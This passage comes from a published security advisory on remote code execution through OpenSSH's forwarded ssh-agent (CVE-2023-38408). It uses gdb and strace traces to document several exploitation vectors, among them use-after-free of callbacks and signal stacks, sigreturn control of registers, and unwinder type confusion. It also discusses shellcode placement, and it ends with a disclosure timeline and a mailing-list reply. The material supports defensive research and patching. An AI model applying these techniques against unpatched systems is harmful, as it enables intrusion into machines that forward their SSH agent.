   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@plt+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@plt+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new ()
got plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        #
0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88
<_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@plt+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@plt+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan
() got plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) =
0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) =
0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347
clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID,
 child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00,
tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed:
/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190,
MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

```
> ```
> From time to time, we noticed the following warning in the dmesg of our
>
> ```

```
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@plt+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@plt+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA
() got plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](33)

### Current thread:

* **CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent** *Qualys Security Advisory via Fulldisclosure (Jul 19)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.openwall.com_4b350e1d_20250125_102958.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2023/07/19/9) [[next>]](2) [[<thread-prev]](../../../2023/07/19/9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID:
 <MN0PR11MB611155CE342371EBED98F38AC039A@MN0PR11MB6111.namprd11.prod.outlook.com>
Date: Wed, 19 Jul 2023 22:13:56 +0000
From: Ramon de C Valle <rcvalle@...e.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Re: CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded
 ssh-agent

> 1/ Some shared libraries require an executable stack, either explicitly
> because of an RWE (readable, writable, executable) GNU_STACK ELF header,
> or implicitly because of a missing GNU_STACK ELF header (in which case
> the loader defaults to an executable stack): when such an "execstack"
> library is dlopen()ed, the loader makes the main stack and all thread
> stacks executable, and they remain executable even after dlclose().
>
> For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
> installation of Ubuntu Desktop 22.04.

I reported and tried to fix this in 2012: [https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0@zmail15.collab.prod.int.phx2.redhat.com/](https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0%40zmail15.collab.prod.int.phx2.redhat.com/), and more recently made a note about it at <https://rcvalle.com/2020/09/16/rust-exploit-mitigations/#appendix>. This is something I'd really like to see properly fixed. IMO, the READ_IMPLIES_EXEC personality needs to be completely separated from the PT_GNU_STACK program header by having a separate option for it (or setarch -X could just be used whenever READ_IMPLIES_EXEC is needed), and the absence of the PT_GNU_STACK program header needs to have more secure defaults (unrelated to READ_IMPLIES_EXEC).

________________________________
From: Qualys Security Advisory <qsa@...lys.com>
Sent: Wednesday, July 19, 2023 9:33 AM
To: oss-security@...ts.openwall.com <oss-security@...ts.openwall.com>
Subject: [oss-security] CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
